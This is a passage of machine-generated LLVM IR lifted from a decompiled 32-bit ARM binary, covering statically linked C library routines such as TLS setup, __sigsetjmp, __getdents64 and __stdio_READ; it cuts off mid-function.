  store i32 %stack_var_-44.3, i32* %v3_17740, align 4
  %v1_17748 = load i32, i32* %r8.global-to-local, align 4
  %v2_17748 = add i32 %v1_17748, 24
  %v3_17748 = inttoptr i32 %v2_17748 to i32*
  store i32 %stack_var_-48.3, i32* %v3_17748, align 4
  %v1_17750 = load i32, i32* %r0.global-to-local, align 4
  %v2_17750 = inttoptr i32 %v1_17750 to i32*
  store i32 1, i32* %v2_17750, align 4
  %v1_17758 = load i32, i32* %r8.global-to-local, align 4
  %v2_17758 = add i32 %v1_17758, 28
  %v3_17758 = inttoptr i32 %v2_17758 to i32*
  store i32 %stack_var_-52.3, i32* %v3_17758, align 4
  %v0_17760 = load i32, i32* @r6, align 4
  %v2_17760 = icmp eq i32 %v0_17760, 0
  %v1_17764 = load i32, i32* %r8.global-to-local, align 4
  %v2_17764 = add i32 %v1_17764, 44
  %v3_17764 = inttoptr i32 %v2_17764 to i32*
  store i32 1, i32* %v3_17764, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_1776c = load i32, i32* %sl.global-to-local, align 4
  %v1_1776c = load i32, i32* %r1.global-to-local, align 4
  %v2_1776c = add i32 %v1_1776c, %v0_1776c
  store i32 %v2_1776c, i32* %r2.global-to-local, align 4
  %v1_17770 = load i32, i32* @r6, align 4
  br i1 %v2_17760, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_17684
  store i32 %v1_17770, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1777c34 = load i32, i32* %r8.global-to-local, align 4
  %v2_1777c35 = add i32 %v1_1777c34, 32
  %v3_1777c36 = inttoptr i32 %v2_1777c35 to i32*
  store i32 %v1_17770, i32* %v3_1777c36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_17684
  %v2_17774 = add i32 %v1_17770, -1
  store i32 %v2_17774, i32* %r0.global-to-local, align 4
  %v1_1777c = load i32, i32* %r8.global-to-local, align 4
  %v2_1777c = add i32 %v1_1777c, 32
  %v3_1777c = inttoptr i32 %v2_1777c to i32*
  store i32 %v1_17770, i32* %v3_1777c, align 4
  %v1_17780 = load i32, i32* @r6, align 4
  store i32 %v1_17780, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_17784 = load i32, i32* %r8.global-to-local, align 4
  %v1_17784 = load i32, i32* %r2.global-to-local, align 4
  %v2_17784 = add i32 %v1_17784, 28
  %v3_17784 = inttoptr i32 %v2_17784 to i32*
  store i32 %v0_17784, i32* %v3_17784, align 4
  %v0_17788 = load i32, i32* %r2.global-to-local, align 4
  %v1_17788 = load i32, i32* %ip.global-to-local, align 4
  %v2_17788 = inttoptr i32 %v1_17788 to i32*
  store i32 %v0_17788, i32* %v2_17788, align 4
  %v0_1778c = load i32, i32* %r0.global-to-local, align 4
  %v1_1778c = load i32, i32* %r3.global-to-local, align 4
  %v2_1778c = add i32 %v1_1778c, %v0_1778c
  store i32 %v2_1778c, i32* %r0.global-to-local, align 4
  %v1_17790 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_17760, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_17798.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_17798 = phi i32 [ %v0_17798.pre, %._crit_edge ], [ %v1_17790, %bb54 ]
  %v2_17794 = udiv i32 %v2_1778c, %v1_17790
  %v2_17798 = load i32, i32* %sb.global-to-local, align 4
  %v3_17798 = mul i32 %v2_17794, %v0_17798
  %v4_17798 = add i32 %v2_17798, %v3_17798
  store i32 %v4_17798, i32* @r0, align 4
  %v0_1779c = load i32, i32* %fp.global-to-local, align 4
  %v2_1779c = icmp ult i32 %v0_1779c, 16
  %v0_1779c. = select i1 %v2_1779c, i32 16, i32 %v0_1779c
  store i32 %v0_1779c., i32* @r1, align 4
  %v2_177ac = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_177ac, i32* @r4, align 4
  store i32 %v6_175c8, i32* @r5, align 4
  store i32 %v15_175c8, i32* %r8.global-to-local, align 4
  store i32 %v18_175c8, i32* %sb.global-to-local, align 4
  store i32 %v21_175c8, i32* %sl.global-to-local, align 4
  store i32 %v24_175c8, i32* %fp.global-to-local, align 4
  store i32 %v27_175c8, i32* @lr, align 4
  %v0_177b0 = call i32 @init_static_tls()
  store i32 %v0_177b0, i32* %r0.global-to-local, align 4
  %v0_177bc.pre = load i32, i32* @ip, align 4
  %v1_17684.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_17694.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_177b4

dec_label_pc_17640.dec_label_pc_177b4.loopexit_crit_edge: ; preds = %dec_label_pc_1763c
  br label %dec_label_pc_177b4.loopexit

dec_label_pc_177b4.loopexit:                      ; preds = %dec_label_pc_17640.dec_label_pc_177b4.loopexit_crit_edge, %dec_label_pc_175f4
  br label %dec_label_pc_177b4

dec_label_pc_177b4:                               ; preds = %dec_label_pc_177b4.loopexit, %entry, %bb55
  %v0_17694.pre.pre = phi i32 [ ptrtoint (i32* @global_var_219f0.357 to i32), %dec_label_pc_177b4.loopexit ], [ ptrtoint (i32* @global_var_219f0.357 to i32), %entry ], [ %v0_17694.pre.pre.pre, %bb55 ]
  %v1_17684.pre.pre = phi i32 [ %v0_175e8, %dec_label_pc_177b4.loopexit ], [ %v0_175e8, %entry ], [ %v1_17684.pre.pre.pre, %bb55 ]
  %v0_177bc = phi i32 [ %v0_175ec, %dec_label_pc_177b4.loopexit ], [ %v0_175ec, %entry ], [ %v0_177bc.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_177bc, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_17680

; uselistorder directives
  uselistorder i32 %v0_177bc, { 1, 0 }
  uselistorder i32 %v1_17770, { 1, 0, 2, 3 }
  uselistorder i32 %v0_176dc, { 1, 0 }
  uselistorder i32 %v2_176d8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1763c, { 2, 1, 0 }
  uselistorder i32 %v3_17614, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_1761c66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_17640, { 1, 0 }
  uselistorder i32 %v0_175ec, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_175e8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_175dc, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 0, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 0, 10, 9, 3, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 7, 6, 8, 9, 10, 11, 12, 3, 0, 1, 2 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 10748, { 0, 2, 1 }
  uselistorder i32 84, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 62, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_177b4, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_17684, { 1, 0 }
  uselistorder label %dec_label_pc_17680, { 1, 0 }
  uselistorder label %dec_label_pc_17604, { 1, 0 }
}

define i32 @function_177d4(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_177d4:
  %v0_177d4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_177d4, label %.thread2, label %.thread7

.thread2:                                         ; preds = %dec_label_pc_177d4
  call void @llvm.trap()
  unreachable

.thread7:                                         ; preds = %dec_label_pc_177d4
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_17800 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_17800
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r2.global-to-local, align 4
  %v4_17810 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 156) to i32*), align 4
  %v4_17818 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 104) to i32*), align 4
  store i32 %v4_17818, i32* %r1.global-to-local, align 4
  %v1_1781c = add i32 %arg1, 44
  %v2_1781c = inttoptr i32 %v1_1781c to i32*
  %v3_1781c = load i32, i32* %v2_1781c, align 4
  %v1_17820 = add i32 %arg1, 28
  %v2_17820 = inttoptr i32 %v1_17820 to i32*
  %v3_17820 = load i32, i32* %v2_17820, align 4
  store i32 %v3_17820, i32* %r2.global-to-local, align 4
  %v2_17824 = inttoptr i32 %v4_17810 to i32*
  store i32 %v3_1781c, i32* %v2_17824, align 4
  %v0_17828 = load i32, i32* %r2.global-to-local, align 4
  %v1_17828 = load i32, i32* %r1.global-to-local, align 4
  %v2_17828 = inttoptr i32 %v1_17828 to i32*
  store i32 %v0_17828, i32* %v2_17828, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 104, { 0, 1, 2, 4, 6, 3, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 156) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_17834(i32 %arg1) local_unnamed_addr {
dec_label_pc_17834:
  %v0_17834 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17834, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17834
  %v1_17834 = load i32, i32* @ip, align 4
  %v3_17834 = mul i32 %v1_17834, %arg1
  %v2_17838 = load i32, i32* @r8, align 4
  %v4_17838 = and i32 %v2_17838, %v3_17834
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17834, %bb
  %v5_17838 = phi i32 [ %arg1, %dec_label_pc_17834 ], [ %v4_17838, %bb ]
  ret i32 %v5_17838

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_17844 = add i32 %arg1, 40
  store i32 %v1_17844, i32* %r2.global-to-local, align 4
  %v1_17848 = inttoptr i32 %v1_17844 to i32*
  %v2_17848 = load i32, i32* %v1_17848, align 4
  store i32 %v2_17848, i32* %r2.global-to-local, align 4
  %v3_17848 = add i32 %arg1, 44
  %v4_17848 = inttoptr i32 %v3_17848 to i32*
  %v5_17848 = load i32, i32* %v4_17848, align 4
  store i32 %v5_17848, i32* %r3.global-to-local, align 4
  %v0_1784c = call i32 @__aeabi_read_tp()
  %v1_17850 = inttoptr i32 %v0_1784c to i32*
  %v2_17850 = load i32, i32* %v1_17850, align 4
  store i32 %v2_17850, i32* %r1.global-to-local, align 4
  %v3_17854 = mul i32 %v5_17848, 8
  store i32 %v3_17854, i32* %r3.global-to-local, align 4
  %v1_17858 = load i32, i32* %r2.global-to-local, align 4
  %v2_17858 = add i32 %v1_17858, %v0_1784c
  %v3_1785c = add i32 %v3_17854, %v2_17850
  %v4_1785c = inttoptr i32 %v3_1785c to i32*
  store i32 %v2_17858, i32* %v4_1785c, align 4
  %v0_17860 = load i32, i32* %r3.global-to-local, align 4
  %v1_17860 = load i32, i32* %r1.global-to-local, align 4
  %v2_17860 = add i32 %v1_17860, %v0_17860
  store i32 %v2_17860, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_17868 = add i32 %v2_17860, 4
  %v5_17868 = inttoptr i32 %v4_17868 to i8*
  store i8 1, i8* %v5_17868, align 1
  %v0_1786c = load i32, i32* @r4, align 4
  %v1_1786c = add i32 %v0_1786c, 20
  store i32 %v1_1786c, i32* %r1.global-to-local, align 4
  %v1_17870 = inttoptr i32 %v1_1786c to i32*
  %v2_17870 = load i32, i32* %v1_17870, align 4
  store i32 %v2_17870, i32* @r1, align 4
  %v3_17870 = add i32 %v0_1786c, 24
  %v4_17870 = inttoptr i32 %v3_17870 to i32*
  %v5_17870 = load i32, i32* %v4_17870, align 4
  store i32 %v5_17870, i32* %r2.global-to-local, align 4
  %v5_17874 = call i32 @__GI_mempcpy(i32 %v2_17858, i32 %v2_17870, i32 %v5_17870, i32 1)
  %v0_17878 = load i32, i32* @r4, align 4
  %v1_17878 = add i32 %v0_17878, 28
  store i32 %v1_17878, i32* %r3.global-to-local, align 4
  %v1_1787c = inttoptr i32 %v1_17878 to i32*
  %v2_1787c = load i32, i32* %v1_1787c, align 4
  store i32 %v2_1787c, i32* %r2.global-to-local, align 4
  %v3_1787c = add i32 %v0_17878, 24
  %v4_1787c = inttoptr i32 %v3_1787c to i32*
  %v5_1787c = load i32, i32* %v4_1787c, align 4
  store i32 %v5_1787c, i32* %r3.global-to-local, align 4
  %v2_17880 = sub i32 %v5_1787c, %v2_1787c
  store i32 %v2_17880, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_17888 = inttoptr i32 %v5_17874 to i8*
  %v4_17888 = call i32 @__GI_memset(i8* %v3_17888, i32 0, i32 %v2_17880)
  ret i32 %v4_17888

; uselistorder directives
  uselistorder i32 %v3_17854, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 1, 2, 3, 5, 4, 11, 10, 9, 6, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_178d8:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 11576) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_178ec = load i32, i32* @r0, align 4
  %v1_178f0 = inttoptr i32 %v0_178ec to i32*
  %v2_178f0 = load i32, i32* @r4, align 4
  store i32 %v2_178f0, i32* %v1_178f0, align 4
  %v3_178f0 = add i32 %v0_178ec, 4
  %v4_178f0 = inttoptr i32 %v3_178f0 to i32*
  %v5_178f0 = load i32, i32* @r5, align 4
  store i32 %v5_178f0, i32* %v4_178f0, align 4
  %v6_178f0 = add i32 %v0_178ec, 8
  %v7_178f0 = inttoptr i32 %v6_178f0 to i32*
  %v8_178f0 = load i32, i32* @r6, align 4
  store i32 %v8_178f0, i32* %v7_178f0, align 4
  %v9_178f0 = add i32 %v0_178ec, 12
  %v10_178f0 = inttoptr i32 %v9_178f0 to i32*
  %v11_178f0 = load i32, i32* @r7, align 4
  store i32 %v11_178f0, i32* %v10_178f0, align 4
  %v12_178f0 = add i32 %v0_178ec, 16
  %v13_178f0 = inttoptr i32 %v12_178f0 to i32*
  %v14_178f0 = load i32, i32* @r8, align 4
  store i32 %v14_178f0, i32* %v13_178f0, align 4
  %v15_178f0 = add i32 %v0_178ec, 20
  %v16_178f0 = inttoptr i32 %v15_178f0 to i32*
  %v17_178f0 = load i32, i32* @sb, align 4
  store i32 %v17_178f0, i32* %v16_178f0, align 4
  %v18_178f0 = add i32 %v0_178ec, 24
  %v19_178f0 = inttoptr i32 %v18_178f0 to i32*
  %v20_178f0 = load i32, i32* @sl, align 4
  store i32 %v20_178f0, i32* %v19_178f0, align 4
  %v21_178f0 = add i32 %v0_178ec, 28
  %v22_178f0 = inttoptr i32 %v21_178f0 to i32*
  %v23_178f0 = load i32, i32* @fp, align 4
  store i32 %v23_178f0, i32* %v22_178f0, align 4
  %v24_178f0 = add i32 %v0_178ec, 32
  %v25_178f0 = inttoptr i32 %v24_178f0 to i32*
  %v27_178f0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_178f0, i32* %v25_178f0, align 4
  %v28_178f0 = add i32 %v0_178ec, 36
  %v29_178f0 = inttoptr i32 %v28_178f0 to i32*
  %v30_178f0 = load i32, i32* @lr, align 4
  store i32 %v30_178f0, i32* %v29_178f0, align 4
  %v0_178f4 = call i32 @__sigjmp_save()
  ret i32 %v0_178f4

; uselistorder directives
  uselistorder i32 %v0_178ec, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @fp, { 95, 96, 6, 7, 8, 9, 10, 11, 12, 13, 83, 84, 85, 86, 87, 89, 88, 90, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0, 24, 25, 30, 31, 26, 27, 28, 29, 32, 33, 34, 35, 1, 36, 37, 38, 39, 40, 41, 2, 3, 4, 5, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 55, 53, 54, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 73, 71, 72, 74, 75, 76, 77, 78, 79, 80, 81, 82, 91, 92, 93, 94 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_178fc = load i32, i32* @r5, align 4
  %v12_178fc = load i32, i32* @r7, align 4
  %v1_17900 = add i32 %arg3, 14
  %v2_17908 = ptrtoint i32* %stack_var_-72 to i32
  %v1_1790c = and i32 %v1_17900, -8
  %v2_17910 = sub i32 %v2_17908, %v1_1790c
  %v1_17914 = add i32 %v2_17910, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_17958, label %dec_label_pc_1793c

dec_label_pc_1793c:                               ; preds = %entry
  %v1_17940 = sub i32 0, %arg1
  %v3_17944 = load i16, i16* @global_var_21a48.352, align 2
  %v4_17944 = sext i16 %v3_17944 to i32
  %v0_17948 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_17950 = add i32 %v4_17944, %v0_17948
  %v4_17950 = inttoptr i32 %v3_17950 to i32*
  store i32 %v1_17940, i32* %v4_17950, align 4
  br label %dec_label_pc_17a28

dec_label_pc_17958:                               ; preds = %entry
  br i1 false, label %dec_label_pc_17a28, label %dec_label_pc_17960

dec_label_pc_17960:                               ; preds = %dec_label_pc_17958
  %v2_17960 = add i32 %v1_17914, %arg1
  store i32 %v2_17960, i32* %r1.global-to-local, align 4
  %v2_17964 = add i32 %tmp, %arg3
  store i32 %v1_17914, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_17a10

dec_label_pc_17980:                               ; preds = %dec_label_pc_17a10
  %v1_17980 = add i32 %v0_179e0, 16
  %v2_17980 = inttoptr i32 %v1_17980 to i16*
  %v3_17980 = load i16, i16* %v2_17980, align 2
  %v4_17980 = zext i16 %v3_17980 to i32
  %v1_17984 = add nsw i32 %v4_17980, -19
  store i32 %v1_17984, i32* @r2, align 4
  %v1_17988 = add nuw nsw i32 %v4_17980, 7
  %v1_1798c = and i32 %v1_17988, 131064
  store i32 %v1_1798c, i32* @ip, align 4
  %v2_17994 = add i32 %v1_1798c, %v0_179e8
  store i32 %v2_17994, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_17994, %v2_17964
  br i1 %tmp24, label %dec_label_pc_179a0, label %dec_label_pc_179dc

dec_label_pc_179a0:                               ; preds = %dec_label_pc_17980
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_179a8 = load i32, i32* %r8.global-to-local, align 4
  %v0_179ac = load i32, i32* %sb.global-to-local, align 4
  %v1_179b0 = load i32, i32* @sp, align 4
  %v2_179b0 = inttoptr i32 %v1_179b0 to i32*
  store i32 0, i32* %v2_179b0, align 4
  %v4_179b4 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_179a8, i32 %v0_179ac)
  %v0_179b8 = load i32, i32* @r5, align 4
  %v1_179b8 = load i32, i32* %sl.global-to-local, align 4
  %v9_179b8 = icmp eq i32 %v0_179b8, %v1_179b8
  br i1 %v9_179b8, label %dec_label_pc_179c0, label %dec_label_pc_17a24

dec_label_pc_179c0:                               ; preds = %dec_label_pc_179a0
  %v0_179c4 = call i32 @__aeabi_read_tp()
  %v3_179c8 = load i16, i16* @global_var_21a48.352, align 2
  %v4_179c8 = sext i16 %v3_179c8 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_179d4 = add i32 %v4_179c8, %v0_179c4
  %v4_179d4 = inttoptr i32 %v3_179d4 to i32*
  store i32 22, i32* %v4_179d4, align 4
  br label %dec_label_pc_17a28

dec_label_pc_179dc:                               ; preds = %dec_label_pc_17980
  %v1_179dc = inttoptr i32 %v0_179e0 to i32*
  %v2_179dc = load i32, i32* %v1_179dc, align 4
  %v3_179dc = add i32 %v0_179e0, 4
  %v4_179dc = inttoptr i32 %v3_179dc to i32*
  %v5_179dc = load i32, i32* %v4_179dc, align 4
  store i32 %v5_179dc, i32* @r4, align 4
  %v1_179e0 = add i32 %v0_179e0, 8
  store i32 %v1_179e0, i32* %r8.global-to-local, align 4
  %v1_179e4 = inttoptr i32 %v1_179e0 to i32*
  %v2_179e4 = load i32, i32* %v1_179e4, align 4
  store i32 %v2_179e4, i32* %r8.global-to-local, align 4
  %v3_179e4 = add i32 %v0_179e0, 12
  %v4_179e4 = inttoptr i32 %v3_179e4 to i32*
  %v5_179e4 = load i32, i32* %v4_179e4, align 4
  store i32 %v5_179e4, i32* %sb.global-to-local, align 4
  %v1_179e8 = inttoptr i32 %v0_179e8 to i32*
  store i32 %v2_179dc, i32* %v1_179e8, align 4
  %v3_179e8 = add i32 %v0_179e8, 4
  %v4_179e8 = inttoptr i32 %v3_179e8 to i32*
  %v5_179e8 = load i32, i32* @r4, align 4
  store i32 %v5_179e8, i32* %v4_179e8, align 4
  %v0_179ec = load i32, i32* %r8.global-to-local, align 4
  %v1_179ec = load i32, i32* @r5, align 4
  %v2_179ec = add i32 %v1_179ec, 8
  %v3_179ec = inttoptr i32 %v2_179ec to i32*
  store i32 %v0_179ec, i32* %v3_179ec, align 4
  %v0_179f0 = load i32, i32* %sb.global-to-local, align 4
  %v1_179f0 = load i32, i32* @r5, align 4
  %v2_179f0 = add i32 %v1_179f0, 12
  %v3_179f0 = inttoptr i32 %v2_179f0 to i32*
  store i32 %v0_179f0, i32* %v3_179f0, align 4
  %v0_179f4 = load i32, i32* @ip, align 4
  %v1_179f4 = trunc i32 %v0_179f4 to i16
  %v2_179f4 = load i32, i32* @r5, align 4
  %v3_179f4 = add i32 %v2_179f4, 16
  %v4_179f4 = inttoptr i32 %v3_179f4 to i16*
  store i16 %v1_179f4, i16* %v4_179f4, align 2
  %v0_179f8 = load i32, i32* @r7, align 4
  %v1_179f8 = add i32 %v0_179f8, 18
  %v2_179f8 = inttoptr i32 %v1_179f8 to i8*
  %v3_179f8 = load i8, i8* %v2_179f8, align 1
  %v4_179f8 = zext i8 %v3_179f8 to i32
  store i32 %v4_179f8, i32* @r3, align 4
  %v2_179fc = load i32, i32* @r5, align 4
  %v3_179fc = add i32 %v2_179fc, 18
  %v4_179fc = inttoptr i32 %v3_179fc to i8*
  store i8 %v3_179f8, i8* %v4_179fc, align 1
  %v0_17a00 = call i32 @memcpy()
  %v0_17a04 = load i32, i32* @r7, align 4
  %v1_17a04 = add i32 %v0_17a04, 16
  %v2_17a04 = inttoptr i32 %v1_17a04 to i16*
  %v3_17a04 = load i16, i16* %v2_17a04, align 2
  %v4_17a04 = zext i16 %v3_17a04 to i32
  %v0_17a08 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_17a08, i32* @r5, align 4
  %v2_17a0c = add i32 %v4_17a04, %v0_17a04
  store i32 %v2_17a0c, i32* @r7, align 4
  br label %dec_label_pc_17a10

dec_label_pc_17a10:                               ; preds = %dec_label_pc_17960, %dec_label_pc_179dc
  %v0_179e8 = phi i32 [ %tmp, %dec_label_pc_17960 ], [ %v0_17a08, %dec_label_pc_179dc ]
  %v0_179e0 = phi i32 [ %v1_17914, %dec_label_pc_17960 ], [ %v2_17a0c, %dec_label_pc_179dc ]
  %v3_17a14 = icmp ult i32 %v0_179e0, %v2_17960
  %v1_17a18 = add i32 %v0_179e8, 19
  store i32 %v1_17a18, i32* @r0, align 4
  %v1_17a1c = add i32 %v0_179e0, 19
  store i32 %v1_17a1c, i32* @r1, align 4
  br i1 %v3_17a14, label %dec_label_pc_17980, label %dec_label_pc_17a24.loopexit

dec_label_pc_17a24.loopexit:                      ; preds = %dec_label_pc_17a10
  %v0_17a24.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_17a24

dec_label_pc_17a24:                               ; preds = %dec_label_pc_17a24.loopexit, %dec_label_pc_179a0
  %v1_17a24 = phi i32 [ %v0_179e8, %dec_label_pc_17a24.loopexit ], [ %v0_179b8, %dec_label_pc_179a0 ]
  %v0_17a24 = phi i32 [ %v0_17a24.pre, %dec_label_pc_17a24.loopexit ], [ %v1_179b8, %dec_label_pc_179a0 ]
  %v2_17a24 = sub i32 %v1_17a24, %v0_17a24
  store i32 %v2_17a24, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17a28

dec_label_pc_17a28:                               ; preds = %dec_label_pc_17958, %dec_label_pc_179c0, %dec_label_pc_1793c, %dec_label_pc_17a24
  %v0_17a28 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_178fc, i32* @r5, align 4
  store i32 %v12_178fc, i32* @r7, align 4
  ret i32 %v0_17a28

; uselistorder directives
  uselistorder i32 %v0_179e0, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_179e8, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_17914, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 8, 9, 0, 3, 10, 4, 11, 12, 5, 6, 7, 1, 13, 2, 14 }
  uselistorder i32 18, { 5, 6, 4, 7, 0, 8, 1, 9, 2, 10, 3, 11 }
  uselistorder i32 22, { 1, 0, 11, 2, 3, 4, 5, 6, 12, 13, 7, 8, 9, 10 }
  uselistorder i32* @sp, { 3, 2, 4, 0, 5, 1 }
  uselistorder i32 -8, { 38, 17, 18, 19, 20, 21, 22, 16, 15, 10, 14, 13, 12, 11, 23, 24, 25, 26, 27, 9, 40, 28, 29, 30, 31, 32, 39, 41, 33, 42, 37, 34, 35, 36, 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_17a28, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_17a10, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17a40 = load i32, i32* @r4, align 4
  store i32 %v3_17a40, i32* %stack_var_-12, align 4
  %v0_17a44 = load i32, i32* %r0.global-to-local, align 4
  %v1_17a44 = inttoptr i32 %v0_17a44 to i16*
  %v2_17a44 = load i16, i16* %v1_17a44, align 2
  %v3_17a44 = zext i16 %v2_17a44 to i32
  store i32 %v3_17a44, i32* @r3, align 4
  %v1_17a48 = and i32 %v3_17a44, 4
  store i32 %v1_17a48, i32* @r5, align 4
  %v2_17a48 = icmp eq i32 %v1_17a48, 0
  store i32 %v0_17a44, i32* @r4, align 4
  br i1 %v2_17a48, label %dec_label_pc_17a5c, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_17a5c:                               ; preds = %entry
  %v1_17a5c = icmp slt i32 %arg2, 0
  br i1 %v1_17a5c, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_17a5c
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_17a5c, %bb18
  %v1_17a64 = add i32 %v0_17a44, 4
  %v2_17a64 = inttoptr i32 %v1_17a64 to i32*
  %v3_17a64 = load i32, i32* %v2_17a64, align 4
